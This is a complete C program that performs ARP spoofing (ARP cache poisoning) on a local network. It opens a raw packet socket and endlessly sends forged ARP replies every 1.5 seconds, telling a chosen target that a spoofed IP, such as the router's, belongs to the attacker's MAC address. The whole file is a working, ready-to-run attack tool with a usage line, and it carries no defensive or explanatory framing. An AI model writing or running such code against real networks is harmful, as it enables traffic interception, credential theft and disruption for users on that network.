#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

// ARP Header struct
struct arp_hdr {
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint32_t sender_ip;
    uint8_t target_mac[6];
    uint32_t target_ip;
} __attribute__((packed));

void parse_mac(const char* mac_str, uint8_t* mac_bytes) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
           &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

int main(int argc, char **argv) {
    if (argc != 6) {
        printf("Use: %s <interface> <sender_ip> <target_ip> <target_mac> <my_mac>\n", argv[0]);
        return 1;
    }

    const char *iface = argv[1];
    uint32_t sender_ip = inet_addr(argv[2]); // We are spoofing this IP (e.g. Router)
    uint32_t target_ip = inet_addr(argv[3]); // To this target IP
    
    uint8_t target_mac[6];
    parse_mac(argv[4], target_mac);
    
    uint8_t my_mac[6];
    parse_mac(argv[5], my_mac);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed (are you root?)");
        return 1;
    }

    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("Failed to get interface index");
        return 1;
    }
    int ifindex = ifr.ifr_ifindex;

    // Buffer for Ethernet frame
    uint8_t frame[sizeof(struct ether_header) + sizeof(struct arp_hdr)];
    memset(frame, 0, sizeof(frame));

    // Ethernet header
    struct ether_header *eth = (struct ether_header *)frame;
    memcpy(eth->ether_dhost, target_mac, 6);
    memcpy(eth->ether_shost, my_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    // ARP header
    struct arp_hdr *arp = (struct arp_hdr *)(frame + sizeof(struct ether_header));
    arp->htype = htons(1); // Ethernet
    arp->ptype = htons(ETH_P_IP); // IPv4
    arp->hlen = 6;
    arp->plen = 4;
    arp->opcode = htons(2); // ARP Reply
    
    memcpy(arp->sender_mac, my_mac, 6); // Tell target that sender_ip is at my_mac
    arp->sender_ip = sender_ip;
    memcpy(arp->target_mac, target_mac, 6);
    arp->target_ip = target_ip;

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = ifindex;
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, target_mac, 6);

    printf("Iniciando ARP Spoof via %s. Sender: %s, Target: %s\n", iface, argv[2], argv[3]);
    while (1) {
        if (sendto(sock, frame, sizeof(frame), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            perror("Send failed");
        }
        usleep(1500000); // 1.5 seconds
    }
    close(sock);
    return 0;
}
